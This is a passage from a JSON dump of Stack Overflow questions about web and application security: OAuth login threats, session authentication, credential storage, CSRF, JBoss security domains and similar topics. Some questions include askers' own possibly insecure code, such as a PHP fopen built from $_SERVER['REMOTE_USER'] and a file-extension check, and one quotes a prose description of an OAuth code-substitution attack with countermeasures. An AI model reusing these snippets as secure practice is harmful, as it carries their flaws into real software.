attempt to login to an application or web site\n    using a victim's identity.  Applications relying on identity data\n    provided by an OAuth protected service API to login users are\n    vulnerable to this threat.  This pattern can be found in so-called\n    \"social login\" scenarios.</p>\n  \n  <p>As a pre-requisite, a resource server offers an API to obtain\n    personal information about a user which could be interpreted as\n    having obtained a user identity.  In this sense the client is\n    treating the resource server API as an \"identity\" API.  A client\n    utilizes OAuth to obtain an access token for the identity API.  It\n    then queries the identity API for an identifier and uses it to look\n    up its internal user account data (login).  The client asssumes that\n    because it was able to obtain information about the user, that the\n    user has been authenticated.</p>\n  \n  <p>If the client uses the grant type \"code\", the attacker needs to\n    gather a valid authorization code of the respective victim from the\n    same identity provider used by the target client application.  The\n    attacker tricks the victim into login into a malicious app (which may\n    appear to be legitimate to the Identity Provider) using the same\n    identity provider as the target application.  This results in the\n    Identity Provider's authorization server issuing an authorization\n    code for the respective identity API.  The malicious app then sends\n    this code to the attacker, which in turn triggers a login process\n    within the target application.  The attacker now manipulates the\n    authorization response and substitutes their code (bound to their\n    identity) for the victim's code.  This code is then exchanged by the\n    client for an access token, which in turn is accepted by the identity\n    API since the audience, with respect to the resource server, is\n    correct.  But since the identifier returned by the identity API is\n    determined by the identity in the access token (issued based on the\n    victim's code), the attacker is logged into the target application\n    under the victim's identity.</p>\n  \n  <p>Impact: the attacker gains access to an application and user-specific\n    data within the application.</p>\n  \n  <p>Countermeasures:</p>\n  \n  <ul>\n  <li><p>All clients must indicate their client id with every request to\n   exchange an authorization code for an access token.  The\n   authorization server must validate whether the particular\n   authorization code has been issued to the particular client.  If\n   possible, the client shall be authenticated beforehand.</p></li>\n  <li><p>Clients should use appropriate protocol, such as OpenID (cf.\n   [openid]) or SAML (cf. [OASIS.sstc-saml-bindings-1.1]) to\n   implement user login.  Both support audience restrictions on\n   clients.</p></li>\n  </ul>\n</blockquote>\n\n<p>This is rather confusing to me: the attacker needs to gather a valid authorization code of the respective victim from the same identity provider used by the target client application. What's \"the respective victim\" and what does \"identity provider\" mean in this and subsequent uses?</p>\n\n<p>The whole attack description is obscure. I came to understand it as \"one shouldn't use OAuth 2.0 to implement user login\", but wouldn't that mean that major platforms such as Facebook are vulnerable? And vulnerable to what, exactly?</p>\n\n<p>I probably only need a clarification of some of the terms used in this paragraph.</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12959526,"title":"Non-registration submission, security concern","body":"<p>I've created a simple script that allows a user to post a message, question or discussion on my site. I've not got anything online yet so I can't show you, but one thing I don't want is registration.</p>\n\n<p>I want a simple, streamlined and quick way for anybody to come on to my site and post a message, to which others can respond (also without registration).</p>\n\n<p>My question is about security. I've made it so that a person may edit their own message only if the following conditions are met:</p>\n\n<ol>\n<li>The IP address <code>($_SERVER['REMOTE_ADDR'])</code> matches the one used to ask the question (I store it in the database).</li>\n<li>No more than 20 minutes have elapsed.</li>\n</ol>\n\n<p>I want to know how easy this would be to break, and how I can make it stronger. I'm an absolute newby when it comes to security and I'll state now I have no real interest in this side of development, I'm more of a client/server developer, but my strong point is JavaScript. </p>\n\n<p>I'm not too clued up on networking either. How easy is it to spoof an IP address and also how common is it to find two users with identical addresses? I am thinking about making a session ID which will be stored in a temporary database as a third clause that must exist in order for edits to take place. Of course this means users will not be able to leave the site and come back to edit.</p>\n\n<p>Could anyone give me some advice on the best way to proceed?</p>\n\n<p>Note: I want to make it clear that I absolutely do not want registration, which would eliminate this problem entirely. I want a free to use, public site that anyone can simply come along and use. </p>\n\n<p>Note 2: I've also taken care of the bot problem with a simple piece of JavaScript requiring the user to interact with the site (quicker than CAPTCHA), so no worries here.</p>\n\n<p>Kind regards.</p>\n"},{"tags":["android","security","android-intent","settings","uri"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12959184,"title":"Android Intent URI to Open Security Settings Page","body":"<p>I would like to have a link in a webpage that would take the user directly to the security settings page. I know that using Intent URIs, several intents can be invoked (e.g. dialler using \"tel:\"). I was wondering if anyone knows about a URI that would open the security settings page.\nIf not, then is there a way to do it using JavaScript?</p>\n"},{"tags":["java","security","glassfish","jersey"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12957686,"title":"Authentification using a user id stored in the session - security risk / bad practice?","body":"<p>I am developing a small REST-webservice for non critical data which will mainly be accessed by a smartphone application. For limiting the access of the users to their individual data (the authorization does not need groups or roles), I need to implement some sort of basic authentification.</p>\n\n<p>As the service will be accessed over HTTP, using HTTP-Authentification seems to be no good idea as the username and password will be sent in cleartext on every request and need to be stored on the client device.</p>\n\n<p>Thus, my idea was to implement authentification the following way:</p>\n\n<ol>\n<li>The user logs on using a login method of my webservice passing their username / password</li>\n<li>This method checks the validity of the username / password combination (based on a database containing salted and hashed passwords)</li>\n<li>If the login is successful, the id of the user (primary key of the database table) is stored in the session as an attribute</li>\n<li>In the following requests, this attribute is used to authentificate the user</li>\n</ol>\n\n<p>In code, my login method would look like the following:</p>\n\n<pre><code>User user = this.authentificate(username, password);\nHttpSession session = request.getSession(true);\nif (user != null)\n   session.setAttribute(\"UserId\", user.getId());\nelse\n   session.invalidate();\n</code></pre>\n\n<p>Afterwards, I would be able to authentificate the user based on the session:</p>\n\n<pre><code>int userId = (int) request.getSession().getAttribute(\"UserId\");\nUser currentUser = getUserById(userId);\n</code></pre>\n\n<p>Can this approach be considered as \"secure\" (no easy session highjacking possible - as far as I understood <a href=\"http://stackoverflow.com/a/5838191/232175\">http://stackoverflow.com/a/5838191/232175</a> , the attributes' values won't leave the server)?<br>\nAre there any downsides or alternatives?</p>\n"},{"tags":["security","encryption","pci-dss"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12950397,"title":"How to encrypt database connection credentials on a web server?","body":"<p>OWASP advise against storing DB credentials in plain text: </p>\n\n<p><a href=\"https://www.owasp.org/index.php/Password_in_Configuration_File\" rel=\"nofollow\">https://www.owasp.org/index.php/Password_in_Configuration_File</a></p>\n\n<p>However, they don't provide suggestions of how to encrypt the DB access credentials, where to store keys, how to manage access to keys, etc. </p>\n\n<p>Has anyone any real-world experience of implementing such a solution who can suggest an architecture on a LAMP stack?</p>\n\n<p>PS - I'm not looking for answers along the lines of \"don't bother - if someone gains root access it's too late\", etc.</p>\n"},{"tags":["java","security","awt","clipboard"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12950381,"title":"system clipboard only inside an application","body":"<p>I have a swing application and I want to copy some text to the system clipboard. I do this with</p>\n\n<pre><code>Clipboard systemClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\nStringSelection dataToClipboard = new StringSelection(stringToCopy);\nsystemClipboard.setContents(dataToClipboard, null);\n</code></pre>\n\n<p>But it exists only inside the app, I can paste it in any text field in it, but when I try to do so in a web browser, it pastes nothing.</p>\n\n<p>I also tried to implement ClipboardOwner interface and pass it's reference instead of <code>null</code>, but it didn't make a difference.</p>\n"},{"tags":[".net","security","authentication","asp.net-mvc-4","asp.net-web-api"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12944880,"title":"web api authentication for 3rd parties and javascript","body":"<p>I am currently implementing web api in my mvc4 application and have a question around authenticating the caller of the web api service.</p>\n\n<p>In my web application, web api will be used for 2 different reasons. Firstly, for my javascript communicate to the server, secondly for third party components communicating with my application.</p>\n\n<p>Because of this, I would like to authenticate the caller of the service. Passing a username and password in the header for either caller is straight forward but the header can be sniffed by illegitimates. If I make the services https, this will prevent against this, but it causes performance issues for my js to be calling it in rich application.</p>\n\n<p>I have looked at examples on the web for this, but cant find a solution as of yet that covers off both of mt scenarios and secures my services. I am interested to hear suggestions as how to solve this problem? For example, how do existing companies secure their services ie twitter. I want to secure my services, to allowable third parties and my javascript. Please educate me!</p>\n"},{"tags":["security","authentication","login","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12946186,"title":"User accounts with no password but emails a login link every time user tries to log in?","body":"<p>I'm thinking of building a user login system for my website in this manner. Users are authenticated by clicking the link sent to his or her email every time he or she needs to log in.</p>\n\n<p>Not sure if anyone has done this before but I'd want to know if this is actually a POSITIVE user experience or a NEGATIVE one?</p>\n\n<p>Off the top of my head, I think this is a positive one because:</p>\n\n<ol>\n<li>User would only need to supply his or her email address to register, thus registration is much easier. (POSITIVE)</li>\n<li>No password or whatsoever stored in website database, which is easier for developers and harder for hackers. (POSITIVE)</li>\n<li>This system makes sure the user is the legal owner of the email (rather than someone who knows / guesses the password). (POSITIVE)</li>\n<li>System needs to be secured in sending out the emails, thus more work for developers / sys admins. (NEGATIVE)</li>\n<li>Emails could be delayed for one reason or another, even 10 seconds would very probably make the user frustrated and eventually give up. (BIG NEGATIVE)</li>\n</ol>\n\n<p>Is this really applicable? Anyone has any first hand experience on this please? Thanks!</p>\n"},{"tags":["wcf","security","rest","authorization"],"answer_count":9,"favorite_count":215,"up_vote_count":233,"down_vote_count":0,"view_count":73839,"score":233,"question_id":7551,"title":"Best Practices for securing a REST API / web service","body":"<p>When designing a REST API or service are there any established best practices for dealing with security (Authentication, Authorization, Identity Management) ?</p>\n\n<p>When building a SOAP API you have WS-Security as a guide and much literature exists on the topic. I have found less information about securing REST endpoints.</p>\n\n<p>While I understand REST intentionally does not have specifications analogous to WS-* I am hoping best practices or recommended patterns have emerged.</p>\n\n<p>Any discussion or links to relevant documents would be very much appreciated.\nIf it matters, we would be using WCF with POX/JSON serialized messages for our REST API's/Services built using v3.5 of the .NET Framework.</p>\n"},{"tags":["c++","security","usb","rfid"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12954850,"title":"Only allow input from RFID reader C++","body":"<p>Right, I haven't got to coding any of this yet but here's my plan:</p>\n\n<ol>\n<li>User scans RFID card with unique ID on it </li>\n<li>ID is read like keyboard input </li>\n<li>ID relates to DB/flat file and relative information is retrieved</li>\n</ol>\n\n<p>Now this is fairly easy and I can do this, I'm just wondering how I can prevent any other input like from my keyboard being read instead of just from the USB port with the RFID reader (keyboard wedge) attached. </p>\n\n<p>Any help would be greatly appreciated.</p>\n\n<p>Thanks,</p>\n\n<p>Nick</p>\n"},{"tags":["security","text","batch","fingerprint"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":43,"score":0,"question_id":12953672,"title":"identify a txt file by characters and there relevent possitions towards eachother in its contents","body":"<p>I want to make a batch file that can find a specific text file not by name but by its contents better yet not by its entire contents but rather by selected parts of it.</p>\n\n<p>For instance if I have a txt file with the contents</p>\n\n<p>Tom-Dick-and-Harry</p>\n\n<p>I would like my batch file to calculate that if there is a line anywhere in the txt file that contains a T and if 7 characters on from that the letter is a K and two characters on from that the letter is an A the file is recognised as being my file and it is deleted.</p>\n\n<p>Perhaps better explained by a batch file that can find a fingerprint this way others can rename my txt file but I will still find it</p>\n\n<p>Dose anybody know how I could achive this?</p>\n"},{"tags":["spring","security","redirect","login"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12952325,"title":"Spring Security : redirect to previous page after login","body":"<p>I want to redirect to previous page after user login always.</p>\n\n<p>I know that redirect to previous page after login when user denied accessing some page.</p>\n\n<p>But I wonder that all that times, if user directly login after click login link or I redirect login page by force.</p>\n\n<p>When the time that I menthion situation above, redirect to index page after login always.</p>\n\n<p>Please help me...... </p>\n"},{"tags":["security","passwords","gmail","password-protection","autoit"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12385838,"title":"How to store passwords on hard drive the right way?","body":"<p>A script is used to send emails (only with Gmail) daily with user interactions. I would like to store their e-mail in hard drive in a plain text file. What is the right way to do it ?  </p>\n\n<ul>\n<li><p>I know one method would be to ask a user for a password to protect the e-mail password, but this method is pointless because the user should type in a new password every time an email is sent, so I rather ask their e-mail password instead.</p></li>\n<li><p>Another way would be to encrypt the password and using a key with combination of specific informations to user like computer name+username+system+... and use this same key to decrpyt the encrypted password. The problem with this, that I'm using <a href=\"http://www.autoitscript.com/site/\" rel=\"nofollow\">Autoit</a> which is easy to decompile, so when a potencial attacker got the encrypted password, they could theoretically know the encryption key so doesn't matter who many uniq information I use for encrypt the password, they could get it anyway.</p></li>\n<li><p>Another way would be to use OAuth for gmail, so the user doesn't need to type in password at all but I can't do that.</p></li>\n</ul>\n\n<p>Any ideas ?</p>\n"},{"tags":["security","drupal","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12952000,"title":"Drupal security ACL","body":"<p>I have a client having website in Drupal . He need to create user and want to assign rights for edit and delete on every column displayed in webpage. I have tried ACL but that didn't work, so Iam planing to have my own code and tables in DB to save table and column permission for each user. But my senior told me that this is security compromise and advise me to use ACL.</p>\n\n<p>What is security risk and what issues can be raised in future if I use my own code and tables to do the job? Plz help me understand this .</p>\n\n<p>Also recommend me how to use ACL or some other work for this scenario....</p>\n"},{"tags":["security","twitter","oauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12944405,"title":"Is it safe to store twitter access tokens client side?","body":"<p>After the Twitter oauth process, once I finally get my access_token_key and access_token_secret is it safe to store these in a javascript variable client side?</p>\n\n<p>As far as I can work out nothing can be done with these keys without the consumer_key/consumer_secret?</p>\n"},{"tags":["sql-server","security","administration"],"answer_count":16,"favorite_count":5,"up_vote_count":20,"down_vote_count":0,"view_count":18814,"score":20,"question_id":2330439,"title":"Access is denied when attaching a database","body":"<p>I am using SQL Server 2008 developer edition. I was trying to attach the AdventureWorks2008 database.  </p>\n\n<p>When I tried to attach, I received an \"access is denied\" error. According to the event log, it came from the O/S: </p>\n\n<blockquote>\n  <p>Open failed: Could not open file D:\\ProjectData\\AdventureWorks\\AdventureWorksLT2008_Data.mdf for file number 0.  OS error: 5(Access is denied.).</p>\n</blockquote>\n\n<p>I thought \"NTFS problem\", but System (and I) have modify access to both files.</p>\n\n<p>I found that I can successfully attach the database if I log in as sa, but my user account won't work.</p>\n\n<p>I am a member of the local administrators group on my machine, and I am in the sysadmins role in SQL Server instance.</p>\n\n<p>Any idea why I had to be logged in as sa?</p>\n"},{"tags":["javascript","security","website"],"answer_count":31,"favorite_count":23,"up_vote_count":86,"down_vote_count":4,"view_count":7368,"score":82,"question_id":373818,"title":"What's with those Do-Not-Use JavaScript People?","body":"<p>I really don't understand what the problem is with those people who ask you not to use JavaScript on your site. </p>\n\n<p><img src=\"http://www.beholdgenealogy.com/img/no_javascript.gif\" alt=\"Why the paranoia?\"></p>\n\n<p>I went through all sorts of trouble trying to remove a couple of JavaScript scripts I used on one of my sites <a href=\"http://groups.google.com/group/soc.genealogy.computing/browse_thread/thread/fc76732425d5f24f\" rel=\"nofollow\">to appease a couple of \"complainers\"</a>. A month later, after a relentless attack by spam bots, I decided I better add the JavaScript spam prevention code back in.</p>\n\n<p>JavaScript is obviously used by a lot of programmers. It is currently the 6th most popular tag here at Stack Overflow. It is used on practically every single website that I know of. </p>\n\n<p>The claim that it is a security risk seems bogus to me. I've had JavaScript on in my browser for as long as I remember, and not once have I found out that anything malicious has happened.</p>\n\n<p>JavaScript has, of course, been extended into AJAX. And AJAX is the thing that makes the wonderful world of Web 2.0 work. And that includes this wonderful Stack Overflow site.</p>\n\n<p>So is there something I'm missing? Is there something wrong with JavaScript that I'm not aware of?</p>\n\n<hr>\n\n<p>Follow-up:</p>\n\n<p>I am flabbergasted by the response to my Question.</p>\n\n<p>The responses are strong and vociferous from the Anti-JavaScript people.</p>\n\n<p>There was one pro-JavaScript comment, and it was voted down (as I write this to -2) by the others.</p>\n\n<p>I turned JavaScript off to add this follow-up. I immediately notice three obvious things (There might be more):</p>\n\n<ol>\n<li><p>A big annoying white on red banner at the top of each page saying: \"Stack Overflow works best with JavaScript enabled\". (Annoyance) </p></li>\n<li><p>Comments cannot be viewed at all or added. You can't vote up or vote down. You can't select the accepted answer. (Loss of functionality)</p></li>\n<li><p>Of course none of the AJAX stuff works. I don't have access to the line of editing tools above this entry box, and I can't see the preview as I type this. (Inconveniences)</p></li>\n</ol>\n\n<p>So as far as I am concerned, turning your JavaScript off results in Annoyances, Loss of Functionality, and Inconvenience.</p>\n\n<p>I'm sorry for the handicapped people who have no JavaScript support, but I still don't get why so many of you are so religiously against using it. </p>\n\n<p>Personally, I love what AJAX and its beautiful interfaces and enhanced functionality are doing to the Web. I try to add such features to my site and it annoys me when the Anti-JavaScript people ask me - no, demand of me to take it out because they can't access them. </p>\n\n<p>But how many of you use Stack Overflow with JavaScript off? None I would expect. Your answer would be that you turn it on for sites you trust like Stack Overflow.</p>\n\n<p>Okay. If I make a site that uses Ajax or JavaScript, then I'm fine with you turning it off until you decide to trust my site. But don't expect me to be required to give you all the functionality that I do to people who trust me. Even Stack Overflow doesn't. </p>\n\n<p>If someone wants to embellish this idea, I'll give them the accepted answer.</p>\n\n<hr>\n\n<p>Also see the question:  <a href=\"http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl\">Is it worth it to code different functionality for users with JavaScript disabled?</a></p>\n\n<p>and <a href=\"http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl#378681\">my answer to that question</a> (which, when I last looked, had been voted down by the Do-Not-Use JavaScript people).</p>\n\n<hr>\n\n<p>Followup.  I found the following opinion about JavaScript at the <a href=\"http://www.polepositionmarketing.com/library/wp-spamfree/#wpsf_how_it_works\" rel=\"nofollow\">WP-SpamFree WordPress Plugin page</a>:</p>\n\n<p>\"Most of the spam hitting your blog originates from bots. Few bots can process JavaScript. Few bots can process cookies. Fewer still, can handle both. In a nutshell, this plugin uses a combo of JavaScript and cookies (on steroids) to weed out the humans from spambots, preventing 99%+ of automated spam from ever getting to your site. Almost 100% of web site visitors will have these turned on by default, so this type of solution works silently in the background, with no inconveniences. There are extremely few users (less than 2%) that have JavaScript and/or cookies turned off by default, but they will be prompted to turn those back on to post their comment.</p>\n\n<p>Stats show that among all Internet users, less than 2% have JavaScript turned off, and less than 1% have cookies turned off. This requirement isnt anything out of the ordinary because most modern websites require the use of JavaScript and cookies for key features  AJAX, for example, wont work if JS is disabled.</p>\n\n<p><strong>Overall, the very few that might be inconvenienced because they have JS and cookies turned off will be far fewer than the 100% who would be annoyed by CAPTCHAs, challenge questions, and other validation methods.</strong>\"</p>\n"},{"tags":["sql","sql-server","security","sql-server-2012","sspi"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12944273,"title":"correct security and user setup for sql server database","body":"<p>I am currently on setting a sql server database on a database server. A front end web application running off a web server communicates to the database.</p>\n\n<p>What is the best approach for setting up users to access the database etc. My plan was:</p>\n\n<ul>\n<li>On web server, create a local user which the application pool runs under and assign it the necessary rights </li>\n<li>On database server, create a sql user that can log in to the database, have necessary permissions on tables/db's etc. This user is what is included in the connection string from the mvc web application to connect to the database.</li>\n</ul>\n\n<p>Is this the best approach - I have read in to mixed mode sql sever with sspi etc etc and I am little confused as to the best secure setup. Any tips or further information would be great.</p>\n\n<p>I have read that sspi is a means of providing an integrated secure trust relationship between the web servers and the back end database servers, without having to transmit sensitive user and password information. Buy I am wondering if what I have outlined sufficent. Note sensitive information such as SSN, credit card numbers etc may be stored in the sql server 2012 database. </p>\n"},{"tags":["iphone","objective-c","ios","security","secure-coding"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":12946664,"title":"How do I prevent format string attacks and buffer overruns on iOS?","body":"<p>Apple's <a href=\"https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/ValidatingInput.html\" rel=\"nofollow\">Secure Coding Guide</a> documentation provides guidance on:</p>\n\n<ul>\n<li>format string attacks</li>\n<li>buffer overflows</li>\n</ul>\n\n<p>What is not clear (to me, anyway) is how to prevent format string attacks and buffer overruns when using NSString.</p>\n\n<p>How do I go about defending against such attacks?\nAre there any categories I can apply to protect against this?\nIs there a \"secure\" NSString equivalent I can use?</p>\n"},{"tags":["security","hypervisor","end-user"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":14,"score":-1,"question_id":12946633,"title":"attestation user log-in hypervisor","body":"<p>Since the current operating system is malicious and untrusted (because of the kernel rookit), I'm focused on how to make use of the hypervisor to attest a user when he/she indeed logs on a remote terminal, considering the OS would cheat me. </p>\n\n<p>I'm considering of constructing a trusted path between the end-user and the hypervisor, but it seems to a kind of protection not attestation. </p>\n\n<p>Also, semantic check to the user-input is not possible, either, which can be easily hampered by the OS. </p>\n\n<p>I wanna ask some advice. \nThanks a lot.</p>\n"}]}
{"total":17772,"page":7,"pagesize":100,"questions":[{"tags":["php","security","magento","csrf","owasp"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12945681,"title":"Magento CSRF protection","body":"<p>I am looking at custom forms in Magento. I saw these tutorials</p>\n\n<p><a href=\"http://fastdivision.com/2012/03/29/diy-magento-create-ajax-login-registration-forms-for-your-magento-theme/\" rel=\"nofollow\">http://fastdivision.com/2012/03/29/diy-magento-create-ajax-login-registration-forms-for-your-magento-theme/</a></p>\n\n<p><a href=\"http://inchoo.net/ecommerce/magento/magento-email/magento-custom-email-contact-form-with-notification-system/\" rel=\"nofollow\">http://inchoo.net/ecommerce/magento/magento-email/magento-custom-email-contact-form-with-notification-system/</a></p>\n\n<p>I did not see any mention of CSRF prevention, like checking a client token with one stored in a user session. I also looked in the Magento Contact Us form, and saw this but I do not think it relates to CSRF:</p>\n\n<pre><code>&lt;input type=\"text\" name=\"hideit\" id=\"hideit\" value=\"\" style=\"display:none !important;\"&gt;\n</code></pre>\n\n<p>Does Magento have any default code for preventing CSRF? Does the $this->getRequest()->getParams() method of Mage_Core_Controller_Front_Action do anything automatically to prevent CSRF that I may be missing?</p>\n"},{"tags":["web-services","security","web-security","w3c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":20,"score":-1,"question_id":12946225,"title":"w3c-like user security certification?","body":"<p>Is there anything like the W3C website inspectors for user security? To make sure that passwords are hashed securely with BCrypt and stuff like that? I'm just wondering because I'm trying to develop a portfolio where I could showcase \"secure\" php code with a little icon like W3C's standards checkers. </p>\n"},{"tags":["php","security","encryption","config"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12945513,"title":"How do I store my website's config file securely?","body":"<p>I have a config.php file for my website that I store outside of the publicly accessible web directory and it contains my password information for a gmail account I use to send mail for the site and my database connection credentials. I don't like the idea of saving the password as a plaintext variable and was looking for some way to have this data more securely saved. Beyond blocking read access to the directory from users other than me, what can I do to secure this information?</p>\n"},{"tags":["asp.net","security","csrf","owasp"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":320,"score":1,"question_id":8500249,"title":"How to Implement CSRF Guard in ASP.Net","body":"<p>I need to implement CSRF(Cross Site Request Forgery) Guard in my code (asp.net).\nThough I got a library from OWASP, implementing it is a pain since no documentation is given. Can someone provide me an easier way to implement csrf guard in .net, or configure OWASP library correctly ?</p>\n\n<p>Thanks</p>\n\n<p>-Chandan</p>\n"},{"tags":["java","security","gwt","exception-handling","client-server"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12923172,"title":"GWT :: process server errors in single place on client side","body":"<p>It is possible to define single point of request handling with special kind of handler with Guice support, like below:</p>\n\n<pre><code>@Singleton\npublic class GuiceRemoteServiceServlet extends RemoteServiceServlet {\n    @Inject\n    private Injector injector;\n\n    @Override\n    public String processCall(String payload) throws SerializationException {\n        RPCRequest req = RPC.decodeRequest(payload, null, this);\n\n        RemoteService service = getServiceInstance(\n                req.getMethod().getDeclaringClass());\n\n        return RPC.invokeAndEncodeResponse(service, req.getMethod(),\n                req.getParameters(), req.getSerializationPolicy());\n\n    }\n\n    @SuppressWarnings({\"unchecked\"})\n    private RemoteService getServiceInstance(Class serviceClass) {\n        return (RemoteService) injector.getInstance(serviceClass);\n    }\n}\n</code></pre>\n\n<p>basically, this is ideal place to do some security-related stuff, like checking if user is authenticated. I need to ensure that the user is authenticated on <strong>any request</strong> to the server. So in general I will add method <em>validateUser</em>, which will return true/false or throw an exception. This method will be invoked within <strong>processCall</strong> in the code above.</p>\n\n<p>Now the question is - how do I handle this authentication response on <strong>client side</strong>? I want to put it into <strong>single place</strong>, and be sure that any service will has this user validation enabled by default. Any new service must be \"secured\" without adding any security-related code. So no copy/paste of this code in \"onFailure\" methods or something like that.</p>\n\n<p>Any thoughts?</p>\n"},{"tags":["php","security","session","session-hijacking","suphp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12926524,"title":"suPHP Security With Sessions","body":"<p>I am trying to better understand suPHP.</p>\n\n<p>I have obviously found the suPHP documentation on google, and have found the generic answers for what it is and does, but I am confused on how it can help with session security and preventing session hijacking.</p>\n\n<p>If anyone could clarify this for me, I'd be grateful. Google isn't yielding any good results!</p>\n"},{"tags":["ruby-on-rails","ajax","facebook","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12943320,"title":"Ajax security of Facebook apps? (Ruby on Rails)","body":"<p>I have a simple voting app where I would like the vote event to be done via ajax. </p>\n\n<pre><code>$.ajax({\n  type: 'POST',\n  url: '/vote',\n  data: '',\n})\n</code></pre>\n\n<p>However, the signed_request is not passed by FB as a parameter for ajax calls. What is the best practice for verifying identity of an ajax request for Facebook apps?</p>\n"},{"tags":["security","node.js"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12932731,"title":"How to protect Node.JS web soket server against connection bomb?","body":"<p>Anyone can request to connect to my real-time application server written by Node.JS which started on port 80.</p>\n\n<p>That means anyone can send large number of curl requests to bomb my socket server causes the connection overflow.\nAny way to detect curl request and reject them?</p>\n\n<p>Thank you.</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":40,"score":-1,"question_id":12926229,"title":"Does endsWith consider a path's file extension, and is this a security vulnerability?","body":"<p>When I call <code>endsWith(\".pdf\")</code>, would this open malware.pdf.exe or just malware.pdf?</p>\n\n<pre><code>String sFileName = request.getParameter(\"fName\");\nif (sFileName.toLowerCase().endsWith(\".pdf\"))\n// open file\nelse\n// dont open the file\n</code></pre>\n"},{"tags":["php","security","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12942065,"title":"Can $_SERVER['REMOTE_USER'] be spoofed?","body":"<p>I have a situation where I am opening a file based on the $_SERVER['REMOTE_USER'] variable.  I don't think this is spoof-able but would just like to confirm.  I do not want to make myself vulnerable to the reading of arbitrary files:</p>\n\n<pre><code>   &lt;?\n      $user = $_SERVER['REMOTE_USER'];\n      $fp = fopen(\"./$user.png\",\"r\");\n   ?&gt;\n</code></pre>\n"},{"tags":["security","jboss7.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":326,"score":0,"question_id":11027918,"title":"Using JBoss 7 DatabaseServerLoginModule with a remote client","body":"<p>we are currently porting a JEE application from JBoss 6 to JBoss 7.1.1. The application has no web interface but only a remote client based on Eclipse RCP. To authenticate clients the remote client uses a \"javax.security.auth.login.LoginContext\" to provide the required credentials. The Server is using the \"DatabaseServerLoginModule\" to authenticate all access to the applications security domain.</p>\n\n<p>To port that application to JBoss 7.1.1 I've done the following:</p>\n\n<p>I've configured a security-domain in the \"standalone-full.xml\":</p>\n\n<pre><code>&lt;security-domain name=\"myDomain\" cache-type=\"default\"&gt;\n  &lt;authentication&gt;\n    &lt;login-module code=\"org.jboss.security.auth.spi.DatabaseServerLoginModule\" flag=\"required\"&gt;\n      &lt;module-option name=\"dsJndiName\" value=\"jdbc/myDS\"/&gt;\n      &lt;module-option name=\"principalsQuery\" value=\"select u.password from users u left join authorizables a on u.id=a.id where a.name=?\"/&gt;\n      &lt;module-option name=\"rolesQuery\" value=\"SELECT 'user', 'Roles' FROM authorizables WHERE name=?\"/&gt;\n    &lt;/login-module&gt;\n  &lt;/authentication&gt;\n&lt;/security-domain&gt;   \n</code></pre>\n\n<p>Next I've configured a security-realm:</p>\n\n<pre><code>&lt;security-realm name=\"MyAppRealm\"&gt;\n  &lt;authentication&gt;\n    &lt;jaas name=\"myDomain\"/&gt;\n  &lt;/authentication&gt;\n&lt;/security-realm&gt;\n</code></pre>\n\n<p>And last I've bound the remoting connector to my custom realm</p>\n\n<pre><code>&lt;connector name=\"remoting-connector\" socket-binding=\"remoting\" security realm=\"MyAppRealm\"/&gt;\n</code></pre>\n\n<p>Now when trying to access the server the following exception is thrown:</p>\n\n<pre><code>ERROR connection:99 - JBREM000200: Remote connection failed: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\n\njavax.naming.NamingException: Failed to create remoting connection [Root exception is java.lang.RuntimeException: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed]\nat org.jboss.naming.remote.client.ClientUtil.namingException(ClientUtil.java:36)\nat org.jboss.naming.remote.client.InitialContextFactory.getInitialContext(InitialContextFactory.java:121)\nat 